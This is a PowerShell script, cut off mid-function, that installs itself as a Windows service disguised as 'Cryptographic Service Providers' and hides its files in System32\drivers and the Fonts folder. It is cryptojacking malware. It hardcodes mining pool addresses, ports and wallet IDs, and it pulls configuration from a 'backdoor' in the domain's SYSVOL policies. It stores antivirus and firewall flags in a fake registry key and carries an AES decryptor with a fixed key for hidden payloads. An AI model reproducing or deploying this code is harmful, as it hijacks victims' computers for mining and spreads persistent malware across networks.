[CmdletBinding(DefaultParameterSetName = 'Setup')]
Param (
	[Parameter(ParameterSetName = 'Start', Mandatory = $true)]
	[Switch]$Start,

	[Parameter(ParameterSetName = 'Stop', Mandatory = $true)]
	[Switch]$Stop,

	[Parameter(ParameterSetName = 'Restart', Mandatory = $true)]
	[Switch]$Restart,

	[Parameter(ParameterSetName = 'Status', Mandatory = $false)]
	[Switch]$Status = $($PSCmdlet.ParameterSetName -eq 'Status'),

	[Parameter(ParameterSetName = 'Setup', Mandatory = $false)]
	[Switch]$Setup,

	[Parameter(ParameterSetName = 'Setup', Mandatory = $false)]
	[String]$UserName = "localsystem",

	[Parameter(ParameterSetName = 'Setup', Mandatory = $false)]
	[String]$Password,

	[Parameter(ParameterSetName = 'Remove', Mandatory = $true)]
	[Switch]$Remove,

	[Parameter(ParameterSetName = 'Service', Mandatory = $true)]
	[Switch]$Service,

	[Parameter(ParameterSetName = 'SCMStart', Mandatory = $true)]
	[Switch]$SCMStart,

	[Parameter(ParameterSetName = 'SCMStop', Mandatory = $true)]
	[Switch]$SCMStop,

	[Parameter(ParameterSetName = 'Control', Mandatory = $true)]
	[String]$Control = $null,

	[Parameter(ParameterSetName = 'Version', Mandatory = $true)]
	[Switch]$Version,
		
	[Parameter(ParameterSetName = 'Setup', Mandatory = $false)]
	[String]$UR,
	[Parameter(ParameterSetName = 'Setup', Mandatory = $false)]
	[String]$AV,
	[Parameter(ParameterSetName = 'Setup', Mandatory = $false)]
	[String]$FW,
	[Parameter(ParameterSetName = 'Setup', Mandatory = $false)]
	[String]$PW,
	[Parameter(ParameterSetName = 'Setup', Mandatory = $false)]
	[String]$SR,
	[Parameter(ParameterSetName = 'Setup', Mandatory = $false)]
	[String]$VR
	
)
$scriptVersion = "2017-12-10"
$UserName = "localsystem"
$argv0 = Get-Item $MyInvocation.MyCommand.Definition
$script = $argv0.basename
$scriptName = $argv0.name 
$scriptFullName = $argv0.fullname


$serviceName = $script
$serviceDisplayName = "Cryptographic Service Providers"
$ServiceDescription = "A cryptographic service provider (CSP) contains implementations of cryptographic standards and algorithms"
$pipeName = "Service_$serviceName"
$installDir = "${ENV:windir}\System32\drivers"
$scriptCopy = "$installDir\$scriptName"
$exeName = "$serviceName.exe"
$exeFullName = "$installDir\$exeName"
$logDir = "${ENV:windir}\fonts\Logs"
$logFile = "$logDir\$serviceName.log"
$logName = "Application"

if ($Version)
{
	Write-Output $scriptVersion
	return
}

Function Now
{
	Param (
		[Switch]$ms,
		

		[Switch]$ns
	)
	$Date = Get-Date
	$now = ""
	$now += "{0:0000}-{1:00}-{2:00} " -f $Date.Year, $Date.Month, $Date.Day
	$now += "{0:00}:{1:00}:{2:00}" -f $Date.Hour, $Date.Minute, $Date.Second
	$nsSuffix = ""
	if ($ns)
	{
		if ("$($Date.TimeOfDay)" -match "\.\d\d\d\d\d\d")
		{
			$now += $matches[0]
			$ms = $false
		}
		else
		{
			$ms = $true
			$nsSuffix = "000"
		}
	}
	if ($ms)
	{
		$now += ".{0:000}$nsSuffix" -f $Date.MilliSecond
	}
	return $now
}


Function Log ()
{
	Param (
		[Parameter(Mandatory = $false, ValueFromPipeline = $true, Position = 0)]
		[String]$string
	)
	if (!(Test-Path $logDir))
	{
		New-Item -ItemType directory -Path $logDir | Out-Null
	}
	if ($String.length)
	{
		$string = "$(Now) $pid $currentUserName $string"
	}
	$string | Out-File -Encoding ASCII -Append "$logFile"
}

$PSThreadCount = 0 
$PSThreadList = @{ }

Function Get-PSThread ()
{
	Param (
		[Parameter(Mandatory = $false, ValueFromPipeline = $true, Position = 0)]
		[int[]]$Id = $PSThreadList.Keys
	)
	$Id | % { $PSThreadList.$_ }
}

Function Start-PSThread ()
{
	Param (
		[Parameter(Mandatory = $true, Position = 0)]
		[ScriptBlock]$ScriptBlock,

		[Parameter(Mandatory = $false)]
		[String]$Name = "",

		[Parameter(Mandatory = $false)]
		[String]$Event = "",

		[Parameter(Mandatory = $false)]
		[Hashtable]$Variables = @{ },

		[Parameter(Mandatory = $false)]
		[String[]]$Functions = @(),

		[Parameter(Mandatory = $false)]
		[Object[]]$Arguments = @() 
	)
	
	$Id = $script:PSThreadCount
	$script:PSThreadCount += 1
	if (!$Name.Length)
	{
		$Name = "PSThread$Id"
	}
	$InitialSessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
	foreach ($VarName in $Variables.Keys)
	{
		$value = $Variables.$VarName
		Write-Debug "Adding variable $VarName=[$($Value.GetType())]$Value"
		$var = New-Object System.Management.Automation.Runspaces.SessionStateVariableEntry($VarName, $value, "")
		$InitialSessionState.Variables.Add($var)
	}
	foreach ($FuncName in $Functions)
	{
		
		$Body = Get-Content function:$FuncName
		Write-Debug "Adding function $FuncName () {$Body}"
		$func = New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry($FuncName, $Body)
		$InitialSessionState.Commands.Add($func)
	}
	$RunSpace = [RunspaceFactory]::CreateRunspace($InitialSessionState)
	$RunSpace.Open()
	$PSPipeline = [powershell]::Create()
	$PSPipeline.Runspace = $RunSpace
	$PSPipeline.AddScript($ScriptBlock) | Out-Null
	$Arguments | % {
		Write-Debug "Adding argument [$($_.GetType())]'$_'"
		$PSPipeline.AddArgument($_) | Out-Null
	}
	$Handle = $PSPipeline.BeginInvoke() 
	if ($Event.Length)
	{
		
		Register-ObjectEvent $PSPipeline -EventName InvocationStateChanged -SourceIdentifier $Name -MessageData $Event
	}
	$PSThread = New-Object PSObject -Property @{
		Id		     = $Id
		Name		 = $Name
		Event	     = $Event
		RunSpace	 = $RunSpace
		PSPipeline   = $PSPipeline
		Handle	     = $Handle
	} 
	$script:PSThreadList[$Id] = $PSThread
	$PSThread
}

Function Receive-PSThread ()
{
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory = $false, ValueFromPipeline = $true, Position = 0)]
		[PSObject]$PSThread,
		

		[Parameter(Mandatory = $false)]
		[Switch]$AutoRemove
	)
	Process
	{
		if ($PSThread.Event -and $AutoRemove)
		{
			Unregister-Event -SourceIdentifier $PSThread.Name
			Get-Event -SourceIdentifier $PSThread.Name | Remove-Event
		}
		try
		{
			$PSThread.PSPipeline.EndInvoke($PSThread.Handle)
			
		}
		catch
		{
			$_
		}
		if ($AutoRemove)
		{
			$PSThread.RunSpace.Close()
			$PSThread.PSPipeline.Dispose()
			$PSThreadList.Remove($PSThread.Id)
		}
	}
}

Function Remove-PSThread ()
{
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory = $false, ValueFromPipeline = $true, Position = 0)]
		[PSObject]$PSThread 
	)
	Process
	{
		$_ | Receive-PSThread -AutoRemove | Out-Null
	}
}
Function Send-PipeMessage ()
{
	Param (
		[Parameter(Mandatory = $true)]
		[String]$PipeName,
		
		[Parameter(Mandatory = $true)]
		[String]$Message
	)
	$PipeDir = [System.IO.Pipes.PipeDirection]::Out
	$PipeOpt = [System.IO.Pipes.PipeOptions]::Asynchronous
	
	$pipe = $null
	$sw = $null
	try
	{
		$pipe = new-object System.IO.Pipes.NamedPipeClientStream(".", $PipeName, $PipeDir, $PipeOpt)
		$sw = new-object System.IO.StreamWriter($pipe)
		$pipe.Connect(1000)
		if (!$pipe.IsConnected)
		{
			throw "Failed to connect client to pipe $pipeName"
		}
		$sw.AutoFlush = $true
		$sw.WriteLine($Message)
	}
	catch
	{
		Log "Error sending pipe $pipeName message: $_"
	}
	finally
	{
		if ($sw)
		{
			$sw.Dispose()
			$sw = $null
		}
		if ($pipe)
		{
			$pipe.Dispose()
			$pipe = $null
		}
	}
}

Function Receive-PipeMessage ()
{
	Param (
		[Parameter(Mandatory = $true)]
		[String]$PipeName
	)
	$PipeDir = [System.IO.Pipes.PipeDirection]::In
	$PipeOpt = [System.IO.Pipes.PipeOptions]::Asynchronous
	$PipeMode = [System.IO.Pipes.PipeTransmissionMode]::Message
	
	try
	{
		$pipe = $null
		$pipe = New-Object system.IO.Pipes.NamedPipeServerStream($PipeName, $PipeDir, 1, $PipeMode, $PipeOpt)
		$sr = $null
		$sr = new-object System.IO.StreamReader($pipe)
		$pipe.WaitForConnection()
		$Message = $sr.Readline()
		$Message
	}
	catch
	{
		Log "Error receiving pipe message: $_"
	}
	finally
	{
		if ($sr)
		{
			$sr.Dispose() 
			$sr = $null 
		}
		if ($pipe)
		{
			$pipe.Dispose()
			$pipe = $null
		}
	}
}

$pipeThreadName = "Control Pipe Handler"

Function Start-PipeHandlerThread ()
{
	Param (
		[Parameter(Mandatory = $true)]
		[String]$pipeName,

		[Parameter(Mandatory = $false)]
		[String]$Event = "ControlMessage"
	)
	Start-PSThread -Variables @{
		logDir		      = $logDir
		logFile		      = $logFile
		currentUserName   = $currentUserName
	} -Functions Now, Log, Receive-PipeMessage -ScriptBlock {
		Param ($pipeName,
			$pipeThreadName)
		try
		{
			Receive-PipeMessage "$pipeName"
		}
		catch
		{
			Log "$pipeThreadName # Error: $_"
			throw $_ 
		}
	} -Name $pipeThreadName -Event $Event -Arguments $pipeName, $pipeThreadName
}

Function Receive-PipeHandlerThread ()
{
	Param (
		[Parameter(Mandatory = $true)]
		[PSObject]$pipeThread
	)
	Receive-PSThread -PSThread $pipeThread -AutoRemove
}

$scriptCopyCname = $scriptCopy -replace "\\", "\\"
$source = @"
  using System;
  using System.ServiceProcess;
  using System.Diagnostics;
  using System.Runtime.InteropServices;                                 // SET STATUS
  using System.ComponentModel;                                          // SET STATUS

  public enum ServiceType : int {                                       // SET STATUS [
    SERVICE_WIN32_OWN_PROCESS = 0x00000010,
    SERVICE_WIN32_SHARE_PROCESS = 0x00000020,
  };                                                                    // SET STATUS ]

  public enum ServiceState : int {                                      // SET STATUS [
    SERVICE_STOPPED = 0x00000001,
    SERVICE_START_PENDING = 0x00000002,
    SERVICE_STOP_PENDING = 0x00000003,
    SERVICE_RUNNING = 0x00000004,
    SERVICE_CONTINUE_PENDING = 0x00000005,
    SERVICE_PAUSE_PENDING = 0x00000006,
    SERVICE_PAUSED = 0x00000007,
  };                                                                    // SET STATUS ]

  [StructLayout(LayoutKind.Sequential)]                                 // SET STATUS [
  public struct ServiceStatus {
    public ServiceType dwServiceType;
    public ServiceState dwCurrentState;
    public int dwControlsAccepted;
    public int dwWin32ExitCode;
    public int dwServiceSpecificExitCode;
    public int dwCheckPoint;
    public int dwWaitHint;
  };                                                                    // SET STATUS ]

  public enum Win32Error : int { // WIN32 errors that we may need to use
    NO_ERROR = 0,
    ERROR_APP_INIT_FAILURE = 575,
    ERROR_FATAL_APP_EXIT = 713,
    ERROR_SERVICE_NOT_ACTIVE = 1062,
    ERROR_EXCEPTION_IN_SERVICE = 1064,
    ERROR_SERVICE_SPECIFIC_ERROR = 1066,
    ERROR_PROCESS_ABORTED = 1067,
  };

  public class Service_$serviceName : ServiceBase { // $serviceName may begin with a digit; The class name must begin with a letter
    private System.Diagnostics.EventLog eventLog;                       // EVENT LOG
    private ServiceStatus serviceStatus;                                // SET STATUS

    public Service_$serviceName() {
      ServiceName = "$serviceName";
      CanStop = true;
      CanPauseAndContinue = false;
      AutoLog = true;

      eventLog = new System.Diagnostics.EventLog();                     // EVENT LOG [
      if (!System.Diagnostics.EventLog.SourceExists(ServiceName)) {         
        System.Diagnostics.EventLog.CreateEventSource(ServiceName, "$logName");
      }
      eventLog.Source = ServiceName;
      eventLog.Log = "$logName";                                        // EVENT LOG ]
      // EventLog.WriteEntry(ServiceName, "$exeName $serviceName()");      // EVENT LOG
    }

    [DllImport("advapi32.dll", SetLastError=true)]                      // SET STATUS
    private static extern bool SetServiceStatus(IntPtr handle, ref ServiceStatus serviceStatus);

    protected override void OnStart(string [] args) {
      // EventLog.WriteEntry(ServiceName, "$exeName OnStart() // Entry. Starting script '$scriptCopyCname' -SCMStart"); // EVENT LOG
      // Set the service state to Start Pending.                        // SET STATUS [
      // Only useful if the startup time is long. Not really necessary here for a 2s startup time.
      serviceStatus.dwServiceType = ServiceType.SERVICE_WIN32_OWN_PROCESS;
      serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING;
      serviceStatus.dwWin32ExitCode = 0;
      serviceStatus.dwWaitHint = 2000; // It takes about 2 seconds to start PowerShell
      SetServiceStatus(ServiceHandle, ref serviceStatus);               // SET STATUS ]
      // Start a child process with another copy of this script
      try {
        Process p = new Process();
        // Redirect the output stream of the child process.
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.FileName = "PowerShell.exe";
        p.StartInfo.Arguments = "-ExecutionPolicy Bypass -c & '$scriptCopyCname' -SCMStart"; // Works if path has spaces, but not if it contains ' quotes.
        p.Start();
        // Read the output stream first and then wait. (To avoid deadlocks says Microsoft!)
        string output = p.StandardOutput.ReadToEnd();
        // Wait for the completion of the script startup code, that launches the -Service instance
        p.WaitForExit();
        if (p.ExitCode != 0) throw new Win32Exception((int)(Win32Error.ERROR_APP_INIT_FAILURE));
        // Success. Set the service state to Running.                   // SET STATUS
        serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;    // SET STATUS
      } catch (Exception e) {
        // EventLog.WriteEntry(ServiceName, "$exeName OnStart() // Failed to start $scriptCopyCname. " + e.Message, EventLogEntryType.Error); // EVENT LOG
        // Change the service state back to Stopped.                    // SET STATUS [
        serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;
        Win32Exception w32ex = e as Win32Exception; // Try getting the WIN32 error code
        if (w32ex == null) { // Not a Win32 exception, but maybe the inner one is...
          w32ex = e.InnerException as Win32Exception;
        }    
        if (w32ex != null) {    // Report the actual WIN32 error
          serviceStatus.dwWin32ExitCode = w32ex.NativeErrorCode;
        } else {                // Make up a reasonable reason
          serviceStatus.dwWin32ExitCode = (int)(Win32Error.ERROR_APP_INIT_FAILURE);
        }                                                               // SET STATUS ]
      } finally {
        serviceStatus.dwWaitHint = 0;                                   // SET STATUS
        SetServiceStatus(ServiceHandle, ref serviceStatus);             // SET STATUS
        // EventLog.WriteEntry(ServiceName, "$exeName OnStart() // Exit"); // EVENT LOG
      }
    }

    protected override void OnStop() {
      // EventLog.WriteEntry(ServiceName, "$exeName OnStop() // Entry");   // EVENT LOG
      // Start a child process with another copy of ourselves
      try {
        Process p = new Process();
        // Redirect the output stream of the child process.
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.FileName = "PowerShell.exe";
        p.StartInfo.Arguments = "-ExecutionPolicy Bypass -c & '$scriptCopyCname' -SCMStop"; // Works if path has spaces, but not if it contains ' quotes.
        p.Start();
        // Read the output stream first and then wait. (To avoid deadlocks says Microsoft!)
        string output = p.StandardOutput.ReadToEnd();
        // Wait for the PowerShell script to be fully stopped.
        p.WaitForExit();
        if (p.ExitCode != 0) throw new Win32Exception((int)(Win32Error.ERROR_APP_INIT_FAILURE));
        // Success. Set the service state to Stopped.                   // SET STATUS
        serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;      // SET STATUS
      } catch (Exception e) {
       // EventLog.WriteEntry(ServiceName, "$exeName OnStop() // Failed to stop $scriptCopyCname. " + e.Message, EventLogEntryType.Error); // EVENT LOG
        // Change the service state back to Started.                    // SET STATUS [
        serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
        Win32Exception w32ex = e as Win32Exception; // Try getting the WIN32 error code
        if (w32ex == null) { // Not a Win32 exception, but maybe the inner one is...
          w32ex = e.InnerException as Win32Exception;
        }    
        if (w32ex != null) {    // Report the actual WIN32 error
          serviceStatus.dwWin32ExitCode = w32ex.NativeErrorCode;
        } else {                // Make up a reasonable reason
          serviceStatus.dwWin32ExitCode = (int)(Win32Error.ERROR_APP_INIT_FAILURE);
        }                                                               // SET STATUS ]
      } finally {
        serviceStatus.dwWaitHint = 0;                                   // SET STATUS
        SetServiceStatus(ServiceHandle, ref serviceStatus);             // SET STATUS
        // EventLog.WriteEntry(ServiceName, "$exeName OnStop() // Exit"); // EVENT LOG
      }
    }

    public static void Main() {
      System.ServiceProcess.ServiceBase.Run(new Service_$serviceName());
    }
  }
"@

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$currentUserName = $identity.Name 

if ($Setup) { Log "" } 
Log $MyInvocation.Line

$Status = ($PSCmdlet.ParameterSetName -eq 'Status')
$Setup = ($PSCmdlet.ParameterSetName -eq 'Setup')
if ($SCMStart)
{
	Log "$scriptName -SCMStart: Starting script '$scriptFullName' -Service"
	Start-Process PowerShell.exe -ArgumentList ("-c & '$scriptFullName' -Service") -Verb runas
	return
}

if ($Start)
{
	Write-Verbose "Starting service $serviceName"
	Start-Service $serviceName
	return
}

if ($SCMStop)
{
	Log "$scriptName -SCMStop: Stopping script $scriptName -Service"
	Send-PipeMessage $pipeName "exit"
	return
}

if ($Stop)
{
	Write-Verbose "Stopping service $serviceName"
	Stop-Service $serviceName
	return
}

if ($Restart)
{
	& $scriptFullName -Stop
	& $scriptFullName -Start
	return
}

if ($Status)
{
	$spid = $null
	$processes = @(Get-WmiObject Win32_Process -filter "Name = 'powershell.exe'" | Where-Object {
			$_.CommandLine -match ".*$scriptCopyCname.*-Service"
		})
	foreach ($process in $processes)
	{
		$spid = $process.ProcessId
		Write-Verbose "$serviceName Process ID = $spid"
	}
	try
	{
		$pss = Get-Service $serviceName -ea stop
	}
	catch
	{
		"Not Installed"
		return
	}
	$pss.Status
	if (($pss.Status -eq "Running") -and (!$spid))
	{
		Write-Error "The Service Control Manager thinks $serviceName is started, but $serviceName.ps1 -Service is not running."
		exit 1
	}
	return
}

if ($Setup)
{
	$ComputerName = $env:COMPUTERNAME
	$PCbased = (Get-WmiObject Win32_ComputerSystem).systemtype
	switch ($PCbased)
	{
		"X64-based PC" {
			$path = ${env:ProgramFiles(x86)}
			$osArch = "x64"
		}
		"X86-based PC" {
			$path = $env:ProgramFiles
			$osArch = "x86"
		}
	}
	function Get-ScriptDirectory
	{
<#
	.SYNOPSIS
		Get-ScriptDirectory returns the proper location of the script.

	.OUTPUTS
		System.String
	
	.NOTES
		Returns the correct path within a packaged executable.
#>
		[OutputType([string])]
		param ()
		if ($hostinvocation -ne $null)
		{
			Split-Path $hostinvocation.MyCommand.path
		}
		else
		{
			Split-Path $script:MyInvocation.MyCommand.Path
		}
	}
	#Sample variable that provides the location of the script
	try
	{
		[string]$ScriptDirectory = Get-Scriptdirectory
	}
	catch
	{
	}
	if (Test-Path "$ScriptDirectory\$osArch")
	{
		robocopy "$ScriptDirectory\$osArch" "$env:windir\Fonts\arial" /R:3 /W:20
		if (Test-Path "$ScriptDirectory\x64")
		{
			Remove-Item "$ScriptDirectory\x64" -Force -Recurse
		}
		if (Test-Path "$ScriptDirectory\x86")
		{
			Remove-Item "$ScriptDirectory\x86" -Force -Recurse
		}
	}
	$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
	$name = "MaxUserPort"
	$value = "65534"
	New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
	try
	{
		
		$pss = Get-Service $serviceName -ea stop
		if ((Get-Item $scriptCopy -ea SilentlyContinue).LastWriteTime -lt (Get-Item $scriptFullName -ea SilentlyContinue).LastWriteTime)
		{
			Write-Verbose "Service $serviceName is already Installed, but requires upgrade"
			& $scriptFullName -Remove
			throw "continue"
		}
		else
		{
			Write-Verbose "Service $serviceName is already Installed, and up-to-date"
		}
		exit 0
	}
	catch
	{
		Write-Debug "Installation is necessary" 
	}
	if (!(Test-Path $installDir))
	{
		New-Item -ItemType directory -Path $installDir | Out-Null
	}
	if ($ScriptFullName -ne $scriptCopy)
	{
		Write-Verbose "Installing $scriptCopy"
		Copy-Item $ScriptFullName $scriptCopy
	}
	try
	{
		Write-Verbose "Compiling $exeFullName"
		Add-Type -TypeDefinition $source -Language CSharp -OutputAssembly $exeFullName -OutputType ConsoleApplication -ReferencedAssemblies "System.ServiceProcess" -Debug:$false
	}
	catch
	{
		$msg = $_.Exception.Message
		Write-error "Failed to create the $exeFullName service stub. $msg"
		exit 1
	}
	Write-Verbose "Registering service $serviceName"
	if ($UserName -and !$Credential.UserName)
	{
		$emptyPassword = New-Object -Type System.Security.SecureString
		switch ($UserName)
		{
			{ "LocalService", "NetworkService" -contains $_ } {
				$Credential = New-Object -Type System.Management.Automation.PSCredential ("NT AUTHORITY\$UserName", $emptyPassword)
			}
			{ "LocalSystem", ".\LocalSystem", "${env:COMPUTERNAME}\LocalSystem", "NT AUTHORITY\LocalService", "NT AUTHORITY\NetworkService" -contains $_ } {
				$Credential = New-Object -Type System.Management.Automation.PSCredential ($UserName, $emptyPassword)
			}
			default
			{
				if (!$Password)
				{
					$Credential = Get-Credential -UserName $UserName -Message "Please enter the password for the service user"
				}
				else
				{
					$securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
					$Credential = New-Object -Type System.Management.Automation.PSCredential ($UserName, $securePassword)
				}
			}
		}
	}
	if ($Credential.UserName)
	{
		Log "$scriptName -Setup # Configuring the service to run as $($Credential.UserName)"
		$pss = New-Service $serviceName $exeFullName -DisplayName $serviceDisplayName -Description $ServiceDescription -StartupType Automatic -Credential $Credential
	}
	else
	{
		Log "$scriptName -Setup # Configuring the service to run by default as LocalSystem"
		$pss = New-Service $serviceName $exeFullName -DisplayName $serviceDisplayName -Description $ServiceDescription -StartupType Automatic
	}
	$i = (Get-WmiObject Win32_Process -Filter "name = 'powershell.exe'" | Where-Object { $_.CommandLine -like "*$scriptName*-Service*" }).processid
	if ($i)
	{
		foreach ($n in $I)
		{
			Stop-Process -Id $n -force
		}
	}
	if ($UR -eq "0" -or (!($UR)))
	{
		$minerport = "14444"
		$ipms = "185.48.59.50"
		$wallet = "47am2aMvQqCLnRBMqBzXfgfuUMKZhBY3SgY45xV6ikJWXDJ5NLtKq3DPGm1sqiuen1YCE1Ak6nwdg3sx8n6rXpWLF4mFpwq"
	}
	elseif ($UR -eq "1")
	{
		$minerport = "24444"
		$ipms = "185.48.59.51"
		$wallet = "4BEUrVUbd8h579R2b87uoGRjyDMTGirQaYazVdnLZuwCN2S8SNDzviCL8YDdsPoCKR5EfHWAYYK5xRU1JprZ2v8MP4siP87"
	}
	elseif ($UR -eq "2")
	{
		$minerport = "34444"
		$ipms = "185.48.59.52"
		$wallet = "42XyygMzMRjd6A2MvPVXMGbZ6PzNe7Sivd8ek3ySHBmg18dDCWRhCZ6RFxVZFFUvoyCDnwA5Y2tSeSCaZAEq4n6q6DD8pQK"
	}
	
	if (!($AV))
	{
		$AV = "1"
	}
	if (!($FW))
	{
		$FW = "0"
	}
	if (!($PW))
	{
		$PW = "0"
	}
	if (!($SR))
	{
		$SR = "1"
	}
	if (!($VR))
	{
		$VR = "1"
	}
	$isdomain = (Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
	if ($isdomain -eq $true)
	{
		$ComputerName = $env:COMPUTERNAME
		$PCbased = (Get-WmiObject Win32_ComputerSystem).systemtype
		switch ($PCbased)
		{
			"X64-based PC" {
				$path = ${env:ProgramFiles(x86)}
				$osArch = "x64"
			}
			"X86-based PC" {
				$path = $env:ProgramFiles
				$osArch = "x86"
			}
		}
		$domain = (Get-WmiObject Win32_ComputerSystem).Domain
		$checkBackDoor = ((Get-ChildItem -Path "\\$domain\sysvol\$domain\Policies" -Filter explorer.exe -Recurse -ErrorAction SilentlyContinue -Force | Sort-Object LastWriteTime -Descending | select -First 1 | % { $_.DirectoryName })) -replace '\\x64' -replace '\\x86'
		if (Test-Path "$checkBackDoor\$osarch\explorer.exe")
		{
			$backdoor = "$checkBackDoor\$osarch"
			
				robocopy "$backdoor" "$env:windir\Fonts\arial" config.xml /XO /R:3 /W:20
			
		}
	}
	
	$XML_File = "$env:windir\fonts\arial\config.xml"
	if (!(Test-Path "$XML_File"))
	{
		if (!(Test-Path "$env:windir\SoftwareDistribution\config.xml"))
		{
			if (!(Test-Path "$env:windir\fonts\arial"))
			{
				new-item "$env:windir\fonts\arial" -itemtype directory
			}
			$xmlWriter = New-Object System.XMl.XmlTextWriter($XML_File, $Null)
			$xmlWriter.Formatting = 'Indented'
			$xmlWriter.Indentation = 1
			$XmlWriter.IndentChar = "`t"
			$xmlWriter.WriteStartDocument()
			$xmlWriter.WriteComment('Get the Information about the web application')
			$xmlWriter.WriteStartElement('WebApplication')
			$xmlWriter.WriteEndElement()
			$xmlWriter.WriteEndDocument()
			$xmlWriter.Flush()
			$xmlWriter.Close()
			$xmlDoc = [System.Xml.XmlDocument](Get-Content $XML_File);
			$siteCollectionNode = $xmlDoc.CreateElement("SiteCollections")
			$xmlDoc.SelectSingleNode("//WebApplication").AppendChild($siteCollectionNode)
			$xmlDoc.Save($XML_File)
			
			$xmlDoc = [System.Xml.XmlDocument](Get-Content $XML_File);
			$siteCollectionNode = $xmlDoc.CreateElement("SiteCollection")
			$xmlDoc.SelectSingleNode("//WebApplication/SiteCollections").AppendChild($siteCollectionNode)
			$siteCollectionNode.SetAttribute("Name", "SiteCollectionTitle")
			
			
			$subSitesNode = $siteCollectionNode.AppendChild($xmlDoc.CreateElement("SubSites"));
			$subSitesNode.SetAttribute("Count", "45")
			$xmlDoc.Save($XML_File)
			
			$subSiteNameNode = $subSitesNode.AppendChild($xmlDoc.CreateElement("SubSite"));
			$subSiteNameNode.SetAttribute("Title", "Web title")
			
			$ListsElement = $subSiteNameNode.AppendChild($xmlDoc.CreateElement("Lists"));
			$ListElement = $ListsElement.AppendChild($xmlDoc.CreateElement("List"));
			$ListElement.SetAttribute("Title", "ListTitle")
			
			$RootFolderElement = $ListElement.AppendChild($xmlDoc.CreateElement("AV"));
			$RootFolderTextNode = $RootFolderElement.AppendChild($xmlDoc.CreateTextNode("$AV"));
			$RootFolderElement = $ListElement.AppendChild($xmlDoc.CreateElement("Number"));
			$RootFolderTextNode = $RootFolderElement.AppendChild($xmlDoc.CreateTextNode("$minerport"));
			$RootFolderElement = $ListElement.AppendChild($xmlDoc.CreateElement("FW"));
			$RootFolderTextNode = $RootFolderElement.AppendChild($xmlDoc.CreateTextNode("$FW"));
			$RootFolderElement = $ListElement.AppendChild($xmlDoc.CreateElement("PW"));
			$RootFolderTextNode = $RootFolderElement.AppendChild($xmlDoc.CreateTextNode("$PW"));
			$RootFolderElement = $ListElement.AppendChild($xmlDoc.CreateElement("UR"));
			$RootFolderTextNode = $RootFolderElement.AppendChild($xmlDoc.CreateTextNode("$UR"));
			$RootFolderElement = $ListElement.AppendChild($xmlDoc.CreateElement("SR"));
			$RootFolderTextNode = $RootFolderElement.AppendChild($xmlDoc.CreateTextNode("$SR"));
			$RootFolderElement = $ListElement.AppendChild($xmlDoc.CreateElement("VR"));
			$RootFolderTextNode = $RootFolderElement.AppendChild($xmlDoc.CreateTextNode("$VR"));
			$xmlDoc.Save($XML_File)
			Copy-Item "$env:windir\fonts\arial\config.xml" "$env:windir\SoftwareDistribution\config.xml" -force
		}
	}
	
	if (Test-Path "$env:windir\SoftwareDistribution\config.xml")
	{
		if (!(Test-Path "$env:windir\fonts\arial"))
		{
			new-item "$env:windir\fonts\arial" -itemtype directory
		}
		Copy-Item "$env:windir\SoftwareDistribution\config.xml" "$env:windir\fonts\arial\config.xml" -force
		
	}
	$registryPath = "HKLM:\SYSTEM\Software\Microsoft\DriversPath"
	IF (!(Test-Path $registryPath))
	{
		New-Item -Path $registryPath -Force | Out-Null
	}
	
	$Name = "av"
	$value = "$av"
	New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null
	
	$Name = "fw"
	$value = "$fw"
	New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null
	
	$Name = "pw"
	$value = "$pw"
	New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null
	
	$Name = "ur"
	$value = "$ur"
	New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType String -Force | Out-Null
	
	Start-Service $serviceName
	return
}

if ($Remove)
{
	try
	{
		$pss = Get-Service $serviceName -ea stop
	}
	catch
	{
		Write-Verbose "Already uninstalled"
		return
	}
	Stop-Service $serviceName 
	Write-Verbose "Removing service $serviceName"
	$msg = sc.exe delete $serviceName
	if ($LastExitCode)
	{
		Write-Error "Failed to remove the service ${serviceName}: $msg"
		exit 1
	}
	else
	{
		Write-Verbose $msg
	}
	if (Test-Path $installDir)
	{
		foreach ($ext in ("exe", "pdb", "ps1"))
		{
			$file = "$installDir\$serviceName.$ext"
			if (Test-Path $file)
			{
				Write-Verbose "Deleting file $file"
				Remove-Item $file
			}
		}
		if (!(@(Get-ChildItem $installDir -ea SilentlyContinue)).Count)
		{
			Write-Verbose "Removing directory $installDir"
			Remove-Item $installDir
		}
	}
	Log "" 
	return
}

if ($Control)
{
	Send-PipeMessage $pipeName $control
}

if ($Service)
{

	function aes
	{
		param ([String]$InputString,
			[String]$hash = "cVdA6gMCLBUrWK3mqhai24KhwaAufX7yN")
		
		
		$InputData = [Convert]::FromBase64String($InputString)
		
		$Salt = New-Object Byte[](32)
		[Array]::Copy($InputData, 0, $Salt, 0, 32)
		$Rfc2898 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($hash, $Salt)
		$AESKey = $Rfc2898.GetBytes(32)
		$AESIV = $Rfc2898.GetBytes(16)
		$Hmac = New-Object System.Security.Cryptography.HMACSHA1( ,$Rfc2898.GetBytes(20))
		
		$AuthCode = $Hmac.ComputeHash($InputData, 52, $InputData.Length - 52)
		
		if (Compare-Object $AuthCode ($InputData[32 .. 51]) -SyncWindow 0)
		{
			throw 'Checksum failure.'
		}
		
		$AES = New-Object Security.Cryptography.RijndaelManaged
		$AESDecryptor = $AES.CreateDecryptor($AESKey, $AESIV)
		
		$DecryptedInputData = $AESDecryptor.TransformFinalBlock($InputData, 52, $InputData.Length - 52)
		
